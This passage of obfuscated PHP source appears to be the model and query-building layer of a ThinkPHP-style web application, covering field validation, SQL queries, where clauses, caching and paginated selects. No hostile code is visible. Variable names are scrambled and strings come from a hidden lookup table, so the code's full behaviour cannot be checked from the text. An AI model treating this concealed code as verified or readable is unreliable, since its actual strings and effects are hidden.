$‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]] = call_user_func_array($ªÑÂ–Ë¢ü‹ë[1], $ÂëÖ‹Í®²Õ¡Ô); } else { $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]] = call_user_func_array(array(&$this, $ªÑÂ–Ë¢ü‹ë[1]), $ÂëÖ‹Í®²Õ¡Ô); } break; case $‘°ãÒë[271]: $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]] = $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[1]]; break; case $‘°ãÒë[321]: if ($‘°ãÒë[33] === $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]]) { unset($‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]]); } break; case $‘°ãÒë[322]: default: $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]] = $ªÑÂ–Ë¢ü‹ë[1]; } if (!1 === $‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]]) { unset($‚áÌá¾Û[$ªÑÂ–Ë¢ü‹ë[0]]); } } } } return $‚áÌá¾Û; } protected function autoValidation($šŒÇÃ úÕ„¼í, $Ô¿¿·) { $ŒøÅáĞâœ• =& $_SERVER[èÍ×öˆøÉ]; if (!empty($this->options[$ŒøÅáĞâœ•[323]])) { $˜ÂÔ¿¦³ = $this->options[$ŒøÅáĞâœ•[323]]; unset($this->options[$ŒøÅáĞâœ•[323]]); } elseif (!empty($this->_validate)) { $˜ÂÔ¿¦³ = $this->_validate; } if (isset($˜ÂÔ¿¦³)) { if ($this->patchValidate) { $this->error = array(); } foreach ($˜ÂÔ¿¦³ as $®¥ÅñõšñçŒ› => $Î¬) { if (empty($Î¬[5]) || $Î¬[5] == THINK_MODEL_BOTH || $Î¬[5] == $Ô¿¿·) { if (0 == strpos($Î¬[2], $ŒøÅáĞâœ•[324]) && strpos($Î¬[2], $ŒøÅáĞâœ•[325])) { $Î¬[2] = think_lang(substr($Î¬[2], 2, -1)); } $Î¬[3] = isset($Î¬[3]) ? $Î¬[3] : THINK_EXISTS_VALIDATE; $Î¬[4] = isset($Î¬[4]) ? $Î¬[4] : $ŒøÅáĞâœ•[326]; switch ($Î¬[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($šŒÇÃ úÕ„¼í, $Î¬)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ŒøÅáĞâœ•[33] != trim($šŒÇÃ úÕ„¼í[$Î¬[0]])) { if (!1 === $this->_validationField($šŒÇÃ úÕ„¼í, $Î¬)) { return !1; } } break; default: if (isset($šŒÇÃ úÕ„¼í[$Î¬[0]])) { if (!1 === $this->_validationField($šŒÇÃ úÕ„¼í, $Î¬)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($îŸ‹ø, $ıÃÄ°¬ìÃ») { if (!1 === $this->_validationFieldItem($îŸ‹ø, $ıÃÄ°¬ìÃ»)) { if ($this->patchValidate) { $this->error[$ıÃÄ°¬ìÃ»[0]] = $ıÃÄ°¬ìÃ»[2]; } else { $this->error = $ıÃÄ°¬ìÃ»[2]; return !1; } } return; } protected function _validationFieldItem($ôñØü¿ğø, $®øª€) { $´ =& $_SERVER[èÍ×öˆøÉ]; switch (strtolower(trim($®øª€[4]))) { case $´[319]: case $´[320]: $¹äó°ÍôÕ = isset($®øª€[6]) ? (array) $®øª€[6] : array(); if (is_string($®øª€[0]) && strpos($®øª€[0], $´[47])) { $®øª€[0] = explode($´[47], $®øª€[0]); } if (is_array($®øª€[0])) { foreach ($®øª€[0] as $²—ş›Æ¢) { $Ô¼ˆ[$²—ş›Æ¢] = $ôñØü¿ğø[$²—ş›Æ¢]; } array_unshift($¹äó°ÍôÕ, $Ô¼ˆ); } else { array_unshift($¹äó°ÍôÕ, $ôñØü¿ğø[$®øª€[0]]); } if ($´[319] == $®øª€[4]) { return call_user_func_array($®øª€[1], $¹äó°ÍôÕ); } else { return call_user_func_array(array(&$this, $®øª€[1]), $¹äó°ÍôÕ); } case $´[327]: return $ôñØü¿ğø[$®øª€[0]] == $ôñØü¿ğø[$®øª€[1]]; case $´[328]: if (is_string($®øª€[0]) && strpos($®øª€[0], $´[47])) { $®øª€[0] = explode($´[47], $®øª€[0]); } $æ¤Ş = array(); if (is_array($®øª€[0])) { foreach ($®øª€[0] as $²—ş›Æ¢) { $æ¤Ş[$²—ş›Æ¢] = $ôñØü¿ğø[$²—ş›Æ¢]; } } else { $æ¤Ş[$®øª€[0]] = $ôñØü¿ğø[$®øª€[0]]; } if (!empty($ôñØü¿ğø[$this->getPk()])) { $æ¤Ş[$this->getPk()] = array($´[329], $ôñØü¿ğø[$this->getPk()]); } if ($this->where($æ¤Ş)->find()) { return !1; } return !0; default: return $this->check($ôñØü¿ğø[$®øª€[0]], $®øª€[1], $®øª€[4]); } } public function check($ªÏûà†Å¦, $˜Ë‰”ÄûŸÀ¸ , $Çª¦é = "\x72\145\x67\145\170") { $³® =& $_SERVER[èÍ×öˆøÉ]; $Çª¦é = strtolower(trim($Çª¦é)); switch ($Çª¦é) { case $³®[7]: case $³®[330]: $ÃÅ’òÍæ = is_array($˜Ë‰”ÄûŸÀ¸ ) ? $˜Ë‰”ÄûŸÀ¸  : explode($³®[47], $˜Ë‰”ÄûŸÀ¸ ); return $Çª¦é == $³®[7] ? in_array($ªÏûà†Å¦, $ÃÅ’òÍæ) : !in_array($ªÏûà†Å¦, $ÃÅ’òÍæ); case $³®[331]: case $³®[332]: if (is_array($˜Ë‰”ÄûŸÀ¸ )) { $®™‰é”ó‰ª = $˜Ë‰”ÄûŸÀ¸ [0]; $ó…Ç„ˆ± = $˜Ë‰”ÄûŸÀ¸ [1]; } else { list($®™‰é”ó‰ª, $ó…Ç„ˆ±) = explode($³®[47], $˜Ë‰”ÄûŸÀ¸ ); } return $Çª¦é == $³®[331] ? $ªÏûà†Å¦ >= $®™‰é”ó‰ª && $ªÏûà†Å¦ <= $ó…Ç„ˆ± : $ªÏûà†Å¦ < $®™‰é”ó‰ª || $ªÏûà†Å¦ > $ó…Ç„ˆ±; case $³®[333]: case $³®[334]: return $Çª¦é == $³®[333] ? $ªÏûà†Å¦ == $˜Ë‰”ÄûŸÀ¸  : $ªÏûà†Å¦ != $˜Ë‰”ÄûŸÀ¸ ; case $³®[335]: $Öæ®Ë§å„¶Úç = mb_strlen($ªÏûà†Å¦, $³®[336]); if (strpos($˜Ë‰”ÄûŸÀ¸ , $³®[47])) { list($®™‰é”ó‰ª, $ó…Ç„ˆ±) = explode($³®[47], $˜Ë‰”ÄûŸÀ¸ ); return $Öæ®Ë§å„¶Úç >= $®™‰é”ó‰ª && $Öæ®Ë§å„¶Úç <= $ó…Ç„ˆ±; } else { return $Öæ®Ë§å„¶Úç == $˜Ë‰”ÄûŸÀ¸ ; } case $³®[337]: list($³ø£Ÿ, $Ÿ€ğ) = explode($³®[47], $˜Ë‰”ÄûŸÀ¸ ); if (!is_numeric($³ø£Ÿ)) { $³ø£Ÿ = strtotime($³ø£Ÿ); } if (!is_numeric($Ÿ€ğ)) { $Ÿ€ğ = strtotime($Ÿ€ğ); } return NOW_TIME >= $³ø£Ÿ && NOW_TIME <= $Ÿ€ğ; case $³®[338]: return in_array(get_client_ip(), explode($³®[47], $˜Ë‰”ÄûŸÀ¸ )); case $³®[339]: return !in_array(get_client_ip(), explode($³®[47], $˜Ë‰”ÄûŸÀ¸ )); case $³®[326]: default: return $this->regex($ªÏûà†Å¦, $˜Ë‰”ÄûŸÀ¸ ); } } public function query($‰‹½û¹ìÉµ“, $©Ì£™Ô¬¤ = false) { $ú— =& $_SERVER[èÍ×öˆøÉ]; if (!is_bool($©Ì£™Ô¬¤) && !is_array($©Ì£™Ô¬¤)) { $©Ì£™Ô¬¤ = func_get_args(); array_shift($©Ì£™Ô¬¤); } $‰‹½û¹ìÉµ“ = str_replace(array($ú—[229], $ú—[340]), $ú—[50], $‰‹½û¹ìÉµ“); $‰‹½û¹ìÉµ“ = $this->parseSql($‰‹½û¹ìÉµ“, $©Ì£™Ô¬¤); return $this->db->query($‰‹½û¹ìÉµ“); } public function execute($ÊÛ, $Îş•‘§ŸØ = false) { if (!is_bool($Îş•‘§ŸØ) && !is_array($Îş•‘§ŸØ)) { $Îş•‘§ŸØ = func_get_args(); array_shift($Îş•‘§ŸØ); } $ÊÛ = $this->parseSql($ÊÛ, $Îş•‘§ŸØ); return $this->db->execute($ÊÛ); } protected function parseSql($œ, $¤½ÆúÅšòä) { $É¢ =& $_SERVER[èÍ×öˆøÉ]; if (!0 === $¤½ÆúÅšòä) { $„¬Í—àØóü = $this->_parseOptions(); $œ = $this->db->parseSql($œ, $„¬Í—àØóü); } elseif (is_array($¤½ÆúÅšòä)) { $¤½ÆúÅšòä = array_map(array($this->db, $É¢[341]), $¤½ÆúÅšòä); $œ = vsprintf($œ, $¤½ÆúÅšòä); } else { $œ = strtr($œ, array($É¢[342] => $this->getTableName(), $É¢[343] => think_config($É¢[242]))); } $this->db->setModel($this->name); return $œ; } public function db($·ì–áÖšÄÁÌ = '', $µİ = '', $£¶ˆµ†€Ğğ¸ø = array()) { $ÕĞŞÙ =& $_SERVER[èÍ×öˆøÉ]; if ($ÕĞŞÙ[33] === $·ì–áÖšÄÁÌ && $this->db) { return $this->db; } static $Í‹ÍßŞ—® = array(); static $²êî«œ¢ÆšÚ“ = array(); if (!isset($²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ]) || isset($²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ]) && $µİ && $Í‹ÍßŞ—®[$·ì–áÖšÄÁÌ] != $µİ) { if (!empty($µİ) && is_string($µİ) && !1 === strpos($µİ, $ÕĞŞÙ[8])) { $µİ = think_config($µİ); } $·ì–áÖšÄÁÌ = think_guid($µİ); $²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ] = Db::getInstance($µİ); } elseif (NULL === $µİ) { $²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ]->close(); unset($²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ]); return; } if (!empty($£¶ˆµ†€Ğğ¸ø)) { if (is_string($£¶ˆµ†€Ğğ¸ø)) { parse_str($£¶ˆµ†€Ğğ¸ø, $£¶ˆµ†€Ğğ¸ø); } foreach ($£¶ˆµ†€Ğğ¸ø as $´Á => $§ô¶°¢Ñ¨Í¬) { $this->setProperty($´Á, $§ô¶°¢Ñ¨Í¬); } } $Í‹ÍßŞ—®[$·ì–áÖšÄÁÌ] = $µİ; $this->db = $²êî«œ¢ÆšÚ“[$·ì–áÖšÄÁÌ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ãÄÒÌ®—‘ı¥ = get_class($this); if ($ãÄÒÌ®—‘ı¥ == $_SERVER[èÍ×öˆøÉ][344]) { return $this->name; } $this->name = substr($ãÄÒÌ®—‘ı¥, 0, -5); } return $this->name; } public function getTableName() { $†‰ÑğæÏ¨û¾ =& $_SERVER[èÍ×öˆøÉ]; if (empty($this->trueTableName)) { $¤ñ½“õÂø = !empty($this->tablePrefix) ? $this->tablePrefix : $†‰ÑğæÏ¨û¾[33]; if (!empty($this->tableName)) { $¤ñ½“õÂø .= $this->tableName; } else { $¤ñ½“õÂø .= think_parse_name($this->name); } $this->trueTableName = strtolower($¤ñ½“õÂø); } return (!empty($this->dbName) ? $this->dbName . $†‰ÑğæÏ¨û¾[95] : $†‰ÑğæÏ¨û¾[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $š =& $_SERVER[èÍ×öˆøÉ]; return isset($this->fields[$š[249]]) ? $this->fields[$š[249]] : $this->pk; } public function getDbFields() { $ÁèøÛ¾Øğ =& $_SERVER[èÍ×öˆøÉ]; if (isset($this->options[$ÁèøÛ¾Øğ[277]])) { $é¨ü = $this->db->getFields($this->options[$ÁèøÛ¾Øğ[277]]); return $é¨ü ? array_keys($é¨ü) : !1; } if ($this->fields) { $é¨ü = $this->fields; unset($é¨ü[$ÁèøÛ¾Øğ[248]], $é¨ü[$ÁèøÛ¾Øğ[249]], $é¨ü[$ÁèøÛ¾Øğ[250]], $é¨ü[$ÁèøÛ¾Øğ[247]]); return $é¨ü; } return !1; } public function data($ÙÌ› = '') { $Ø =& $_SERVER[èÍ×öˆøÉ]; if ($Ø[33] === $ÙÌ› && !empty($this->data)) { return $this->data; } if (is_object($ÙÌ›)) { $ÙÌ› = get_object_vars($ÙÌ›); } elseif (is_string($ÙÌ›)) { parse_str($ÙÌ›, $ÙÌ›); } elseif (!is_array($ÙÌ›)) { think_exception(think_lang($Ø[269])); } $this->data = $ÙÌ›; return $this; } public function join($ÙÊÙ¨Ş÷Úú) { $øÇÍ¼‡ =& $_SERVER[èÍ×öˆøÉ]; if (is_array($ÙÊÙ¨Ş÷Úú)) { $this->options[$øÇÍ¼‡[280]] = $ÙÊÙ¨Ş÷Úú; } elseif (!empty($ÙÊÙ¨Ş÷Úú)) { $this->options[$øÇÍ¼‡[280]][] = $ÙÊÙ¨Ş÷Úú; } return $this; } public function union($ĞÉœÚåÇÄ», $ÚÊÛ‚Êï© = false) { $‰ô =& $_SERVER[èÍ×öˆøÉ]; if (empty($ĞÉœÚåÇÄ»)) { return $this; } if ($ÚÊÛ‚Êï©) { $this->options[$‰ô[345]][$‰ô[346]] = !0; } if (is_object($ĞÉœÚåÇÄ»)) { $ĞÉœÚåÇÄ» = get_object_vars($ĞÉœÚåÇÄ»); } if (is_string($ĞÉœÚåÇÄ»)) { $å€½Ì±åÛ = $ĞÉœÚåÇÄ»; } elseif (is_array($ĞÉœÚåÇÄ»)) { if (isset($ĞÉœÚåÇÄ»[0])) { $this->options[$‰ô[345]] = array_merge($this->options[$‰ô[345]], $ĞÉœÚåÇÄ»); return $this; } else { $å€½Ì±åÛ = $ĞÉœÚåÇÄ»; } } else { think_exception(think_lang($‰ô[269])); } $this->options[$‰ô[345]][] = $å€½Ì±åÛ; return $this; } public function cache($— = true, $Ş¢ÈŸ¹«Ëê = null, $‹èí¥Ë = '') { $ıéœ§ü·¦ =& $_SERVER[èÍ×öˆøÉ]; if (!1 !== $—) { $this->options[$ıéœ§ü·¦[347]] = array($ıéœ§ü·¦[93] => $—, $ıéœ§ü·¦[337] => $Ş¢ÈŸ¹«Ëê, $ıéœ§ü·¦[29] => $‹èí¥Ë); } return $this; } public function field($¥šëØÙ–éŒÏ, $Äë¸ææù¬¤û = false) { $‘­ =& $_SERVER[èÍ×öˆøÉ]; if (!0 === $¥šëØÙ–éŒÏ) { $›—‡â‚ = $this->getDbFields(); $¥šëØÙ–éŒÏ = $›—‡â‚ ? $›—‡â‚ : $‘­[182]; } elseif ($Äë¸ææù¬¤û) { if (is_string($¥šëØÙ–éŒÏ)) { $¥šëØÙ–éŒÏ = explode($‘­[47], $¥šëØÙ–éŒÏ); } $›—‡â‚ = $this->getDbFields(); $¥šëØÙ–éŒÏ = $›—‡â‚ ? array_diff($›—‡â‚, $¥šëØÙ–éŒÏ) : $¥šëØÙ–éŒÏ; } $this->options[$‘­[271]] = $¥šëØÙ–éŒÏ; return $this; } public function scope($ò¢ŠİŠ‰ = '', $Ã½ = NULL) { $Êˆä´ä =& $_SERVER[èÍ×öˆøÉ]; if ($Êˆä´ä[33] === $ò¢ŠİŠ‰) { if (isset($this->_scope[$Êˆä´ä[34]])) { $ÖĞ±é = $this->_scope[$Êˆä´ä[34]]; } else { return $this; } } elseif (is_string($ò¢ŠİŠ‰)) { $¼Óãï = explode($Êˆä´ä[47], $ò¢ŠİŠ‰); $ÖĞ±é = array(); foreach ($¼Óãï as $ó‰‰¶) { if (!isset($this->_scope[$ó‰‰¶])) { continue; } $ÖĞ±é = array_merge($ÖĞ±é, $this->_scope[$ó‰‰¶]); } if (!empty($Ã½) && is_array($Ã½)) { $ÖĞ±é = array_merge($ÖĞ±é, $Ã½); } } elseif (is_array($ò¢ŠİŠ‰)) { $ÖĞ±é = $ò¢ŠİŠ‰; } if (is_array($ÖĞ±é) && !empty($ÖĞ±é)) { $this->options = array_merge($this->options, array_change_key_case($ÖĞ±é)); } return $this; } public function where($¥©¿ÅÕàŞ‡ßŠ, $ãúÄÑ ¢Ãü = null) { $¸™ =& $_SERVER[èÍ×öˆøÉ]; if (!is_null($ãúÄÑ ¢Ãü) && is_string($¥©¿ÅÕàŞ‡ßŠ)) { if (!is_array($ãúÄÑ ¢Ãü)) { $ãúÄÑ ¢Ãü = func_get_args(); array_shift($ãúÄÑ ¢Ãü); } $ãúÄÑ ¢Ãü = array_map(array($this->db, $¸™[341]), $ãúÄÑ ¢Ãü); $¥©¿ÅÕàŞ‡ßŠ = vsprintf($¥©¿ÅÕàŞ‡ßŠ, $ãúÄÑ ¢Ãü); } elseif (is_object($¥©¿ÅÕàŞ‡ßŠ)) { $¥©¿ÅÕàŞ‡ßŠ = get_object_vars($¥©¿ÅÕàŞ‡ßŠ); } elseif (is_array($¥©¿ÅÕàŞ‡ßŠ)) { foreach ($¥©¿ÅÕàŞ‡ßŠ as $õ¹çå‘Û¹Œ => $ºÊ) { if ((is_numeric($õ¹çå‘Û¹Œ) || !$õ¹çå‘Û¹Œ) && is_string($ºÊ)) { if (strpos($ºÊ, $¸™[348]) === 0) { continue; } think_trace($¸™[349], $¸™[33], $¸™[46]); die; } } } if (is_string($¥©¿ÅÕàŞ‡ßŠ) && $¸™[33] != $¥©¿ÅÕàŞ‡ßŠ) { $¼À = array(); $¼À[$¸™[350]] = $¥©¿ÅÕàŞ‡ßŠ; $¥©¿ÅÕàŞ‡ßŠ = $¼À; } if (isset($this->options[$¸™[273]])) { $this->options[$¸™[273]] = array_merge($this->options[$¸™[273]], $¥©¿ÅÕàŞ‡ßŠ); } else { $this->options[$¸™[273]] = $¥©¿ÅÕàŞ‡ßŠ; } return $this; } public function limit($Èö , $ÓşÕ = null) { $Õ¢ =& $_SERVER[èÍ×öˆøÉ]; $this->options[$Õ¢[290]] = is_null($ÓşÕ) ? $Èö  : $Èö  . $Õ¢[47] . $ÓşÕ; return $this; } public function page($†È—¡®ÑÇ, $†®ƒØÎ³ = null) { $Ã÷· =& $_SERVER[èÍ×öˆøÉ]; $this->options[$Ã÷·[351]] = is_null($†®ƒØÎ³) ? $†È—¡®ÑÇ : $†È—¡®ÑÇ . $Ã÷·[47] . $†®ƒØÎ³; return $this; } public function comment($˜¹‚¯–éƒ) { $this->options[$_SERVER[èÍ×öˆøÉ][352]] = $˜¹‚¯–éƒ; return $this; } public function setProperty($Î¿¦óÕš¯ıÒ´, $‹ë¤£Ğóú) { if (property_exists($this, $Î¿¦óÕš¯ıÒ´)) { $this->{$Î¿¦óÕš¯ıÒ´} = $‹ë¤£Ğóú; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\x69\155\145", "\x74\x69\155\145", "\x69\x6e\163\145\x72\x74\54\x75\x70\x64\x61\x74\x65", "\x66\x75\x6e\x63\164\151\x6f\x6e"), array("\143\x72\145\x61\x74\x65\x54\x69\155\x65", "\x74\x69\155\x65", "\151\x6e\163\145\162\x74", "\x66\x75\x6e\143\164\151\x6f\x6e")); public function setDataAuto($û–Å­½¼åÂ) { $this->dataAuto = $û–Å­½¼åÂ; } public function __construct($¯å = '', $êãÖˆÜ‰¯ = '', $®Â¾áÀ = '') { parent::__construct($¯å, $êãÖˆÜ‰¯, $®Â¾áÀ); } protected $tableMeta = array(); protected function _beforeInsert(&$’ , $›­) { $ôË =& $_SERVER[èÍ×öˆøÉ]; if (!$this->checkDataAutoHas($ôË[353])) { return; } $this->dataBeforeFilter($’ , $ôË[353]); } protected function _beforeUpdate(&$’ŞÃ, $ªÀ«à¬Û¨) { $—ğ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->checkDataAutoHas($—ğ[354])) { return; } $this->dataBeforeFilter($’ŞÃ, $—ğ[354]); } protected function _afterSelect(&$Â‡ê Ÿ×Àóœ, $ÇóÃ) { if (!is_array($Â‡ê Ÿ×Àóœ)) { return; } if (!$this->checkDataAutoHas($_SERVER[èÍ×öˆøÉ][355])) { return; } foreach ($Â‡ê Ÿ×Àóœ as &$ÙˆÄÉ‹œÕÅ) { $this->dataAfterFilter($ÙˆÄÉ‹œÕÅ); } unset($ÙˆÄÉ‹œÕÅ); } protected function _afterFind(&$­Â, $İ’ÌÙú±†œÑ¾) { if (!is_array($­Â)) { return; } if (!$this->checkDataAutoHas($_SERVER[èÍ×öˆøÉ][355])) { return; } $this->dataAfterFilter($­Â); } public static function textEncode($³ö) { if (!$³ö) { return $³ö; } $ÉµÒøØ¼ç² = json_encode($³ö); $ÉµÒøØ¼ç² = preg_replace_callback($_SERVER[èÍ×öˆøÉ][356], function ($ò‹ï¾ï) { return addslashes($ò‹ï¾ï[0]); }, $ÉµÒøØ¼ç²); return json_decode($ÉµÒøØ¼ç²); } public static function textDecode($€µ) { $úñô¾ĞÚï =& $_SERVER[èÍ×öˆøÉ]; $Öå = json_encode($€µ); $Öå = preg_replace_callback($úñô¾ĞÚï[357], function ($êß¶ó‰ûÏ¡) { return $_SERVER[èÍ×öˆøÉ][97]; }, $Öå); return json_decode($Öå); } public function setAutoIncrement($¦´ÔÅ©‰ƒœ¢) { $Ö†··÷««Ÿ = array($this->getPk() => $¦´ÔÅ©‰ƒœ¢); $–à = $this->data($Ö†··÷««Ÿ)->add(); if ($–à) { $this->delete($–à); } } public function getAutoIncrement() { $¶Ë® = $this->getTableName(); $áèûĞª = $this->max($this->getPk()); $‚˜»¨ßÅû¼ = $this->query("\163\150\157\167\x20\164\x61\x62\x6c\145\40\163\x74\x61\x74\165\163\40\167\150\x65\162\145\x20\x4e\141\x6d\145\75\x27{$¶Ë®}\x27"); $æ‘ = $‚˜»¨ßÅû¼[0][$_SERVER[èÍ×öˆøÉ][358]]; $¢ = max($áèûĞª, $æ‘); return $¢; } protected function _callBefore($î–™†ı, $À‚ç³¶ƒÂ¦á¼) { return $this->cacheCallCheck($î–™†ı, $À‚ç³¶ƒÂ¦á¼, !1); } protected function _callAfter($Å¤û¬, $÷¸™‰ˆ) { return $this->cacheCallCheck($Å¤û¬, $÷¸™‰ˆ, !0); } protected function cacheFunctionAlias($˜§î€¡) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($¡ÖŸ², $ôšôêóâÙ°°ß, $¡¸Æ´ = false) { $ÜşÉ ç³Í­¢Ğ = $this->cacheFunctionAlias($ôšôêóâÙ°°ß); if (!$ÜşÉ ç³Í­¢Ğ) { return; } foreach ($ÜşÉ ç³Í­¢Ğ as $›­ÊÛÚ­ğª³ => $í) { $Û¼ºŸ„Ù¯Â×ä = $í[0]; $Óó = explode($_SERVER[èÍ×öˆøÉ][47], $í[1]); if ($¡ÖŸ² == $›­ÊÛÚ­ğª³) { return $this->cacheFunctionGet($›­ÊÛÚ­ğª³, $Û¼ºŸ„Ù¯Â×ä); } if ($¡¸Æ´ && in_array($¡ÖŸ², $Óó)) { $this->cacheFunctionClear($›­ÊÛÚ­ğª³, $Û¼ºŸ„Ù¯Â×ä); } } } public function cacheFunctionGet($èã¾, $çôÔ) { $ ¥Î§òÓÀ = $this->cacheKeyMake($èã¾, $çôÔ); $Ú²ÀÎ†İ“ = Cache::get($ ¥Î§òÓÀ); if (!is_array($Ú²ÀÎ†İ“)) { $Ú²ÀÎ†İ“ = call_user_func_array(array($this, $èã¾), array($çôÔ, !0)); Cache::set($ ¥Î§òÓÀ, $Ú²ÀÎ†İ“); } return $Ú²ÀÎ†İ“; } public function cacheFunctionClear($¸§›ĞÌÉ, $’£Íñæ) { $²Şî·‚ÛÙ = $’£Íñæ; if (!is_array($’£Íñæ)) { $²Şî·‚ÛÙ = array($’£Íñæ); } foreach ($²Şî·‚ÛÙ as $µ²â°Æ) { $öÒÎ‹±²ê­´™ = $this->cacheKeyMake($¸§›ĞÌÉ, $µ²â°Æ); Cache::remove($öÒÎ‹±²ê­´™); } } private function cacheKeyMake($²Şİì, $ã‘Ùƒ—) { $¯€¼‹³ş =& $_SERVER[èÍ×öˆøÉ]; return get_class($this) . $¯€¼‹³ş[71] . $²Şİì . $¯€¼‹³ş[359] . $ã‘Ùƒ—; } protected function selectPageReset() { $€ì‘ìŞŸİ±Ç =& $_SERVER[èÍ×öˆøÉ]; if (isset($GLOBALS[$€ì‘ìŞŸİ±Ç[360]])) { return; } $GLOBALS[$€ì‘ìŞŸİ±Ç[360]] = isset($GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[361]]) ? $GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[361]] : !1; $GLOBALS[$€ì‘ìŞŸİ±Ç[362]] = isset($GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[351]]) ? $GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[351]] : !1; $GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[361]] = !1; $GLOBALS[$€ì‘ìŞŸİ±Ç[7]][$€ì‘ìŞŸİ±Ç[351]] = !1; } protected function selectPageRestore() { $À¯üô¯ïÇ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($GLOBALS[$À¯üô¯ïÇ[360]])) { return; } $GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[361]] = $GLOBALS[$À¯üô¯ïÇ[360]]; $GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[351]] = $GLOBALS[$À¯üô¯ïÇ[362]]; if ($GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[361]] === !1) { unset($GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[361]]); } if ($GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[351]] === !1) { unset($GLOBALS[$À¯üô¯ïÇ[7]][$À¯üô¯ïÇ[351]]); } unset($GLOBALS[$À¯üô¯ïÇ[360]]); unset($GLOBALS[$À¯üô¯ïÇ[362]]); } protected function selectPage($•Éí¡ = 200, $ÅŸà³³™ğÌ = 1) { $¦ÚÏíŠ =& $_SERVER[èÍ×öˆøÉ]; global $in; $ê‚æÏ¸· = $this->optionsValue(); $÷÷ÛÚ„ = 50000; $•Éí¡ = isset($in[$¦ÚÏíŠ[361]]) && $in[$¦ÚÏíŠ[361]] ? $in[$¦ÚÏíŠ[361]] : $•Éí¡; if ($•Éí¡ === -1) { $in[$¦ÚÏíŠ[361]] = !1; $÷÷ÛÚ„ = 100000000; $•Éí¡ = $÷÷ÛÚ„; } $™å = $ê‚æÏ¸·; $™å[$¦ÚÏíŠ[363]] = array(); $•Éí¡ = intval($•Éí¡); $•Éí¡ = $•Éí¡ <= 5 ? 5 : ($•Éí¡ >= $÷÷ÛÚ„ ? $÷÷ÛÚ„ : $•Éí¡); $ÅŸà³³™ğÌ = intval(isset($in[$¦ÚÏíŠ[351]]) && $in[$¦ÚÏíŠ[351]] ? $in[$¦ÚÏíŠ[351]] : $ÅŸà³³™ğÌ); $ÅŸà³³™ğÌ = $ÅŸà³³™ğÌ <= 1 ? 1 : $ÅŸà³³™ğÌ; $îı = array(); $ô—şÙòÅêÊ = 1; if ($ÅŸà³³™ğÌ == 1 && $ô—şÙòÅêÊ) { $this->optionsValue($ê‚æÏ¸·); $îı = $this->page($ÅŸà³³™ğÌ, $•Éí¡)->select(); $ÆÅ¿Â¹ë = is_array($îı) ? count($îı) : 0; if ($ÆÅ¿Â¹ë < $•Éí¡) { $Ù·ë = 1; } else { $this->optionsValue($™å); $ÆÅ¿Â¹ë = intval($this->count()); $Ù·ë = ceil($ÆÅ¿Â¹ë / $•Éí¡); } } else { $this->optionsValue($™å); $ÆÅ¿Â¹ë = intval($this->count()); $Ù·ë = ceil($ÆÅ¿Â¹ë / $•Éí¡); $ÅŸà³³™ğÌ = $ÅŸà³³™ğÌ >= $Ù·ë ? $Ù·ë : $ÅŸà³³™ğÌ; $this->optionsValue($ê‚æÏ¸·); $îı = $this->page($ÅŸà³³™ğÌ, $•Éí¡)->select(); } if (!is_array($îı)) { $îı = array(); } if ($Ù·ë == 1) { $ÆÅ¿Â¹ë = count($îı); } $¡¶å°Âà¢¾Ï = array($¦ÚÏíŠ[364] => array($¦ÚÏíŠ[365] => $ÆÅ¿Â¹ë, $¦ÚÏíŠ[361] => $•Éí¡, $¦ÚÏíŠ[351] => $ÅŸà³³™ğÌ, $¦ÚÏíŠ[366] => $Ù·ë), $¦ÚÏíŠ[367] => $îı); return $¡¶å°Âà¢¾Ï; } protected function checkLength($¤…Ê¶, $ËÙ£ìËùÇ§®› = 0, $¥â = '') { $ùØËã¸´ =& $_SERVER[èÍ×öˆøÉ]; $ËÙ£ìËùÇ§®› = $ËÙ£ìËùÇ§®› ? $ËÙ£ìËùÇ§®› : 65536; if (!$¤…Ê¶ || strlen($¤…Ê¶) < $ËÙ£ìËùÇ§®›) { return; } $¥â = $¥â ? $¥â . $ùØËã¸´[68] : $ùØËã¸´[33]; show_json($¥â . LNG($ùØËã¸´[368]) . "\50{$ËÙ£ìËùÇ§®›}\x29", !1); } protected function metaSet($’¬¬£Õ£¾, 